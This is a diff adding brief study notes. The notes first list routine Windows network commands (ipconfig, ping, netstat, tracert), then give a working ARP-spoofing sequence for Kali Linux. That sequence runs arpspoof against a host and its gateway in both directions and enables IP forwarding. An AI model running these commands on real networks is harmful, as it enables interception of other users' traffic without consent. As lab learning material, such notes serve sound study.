@@ -1,0 +1,37 @@
+***Network analysis in windows cmd"
+
+ipconfig
+
+ipconfig/displaydns
+
+ipconfig/release
+
+ping google.com
+
+netstat
+
+tracert facebook.com
+
+ping Netflix.com 
+
+
+***Arp poising in kali linux and window cmd***
+
+arp -a
+
+kali linux-->
+
+sudo su -
+
+arpspoof -i eth0 -t 192.168.0.106 192.168.0.1 - Term-1 -run(3)
+
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.106 - Term -2-run(2)
+
+echo 1 > /proc/sys/net/ipv4/ip_forward - Term - 3 - run(1)
+
+
+
+
+
+
+
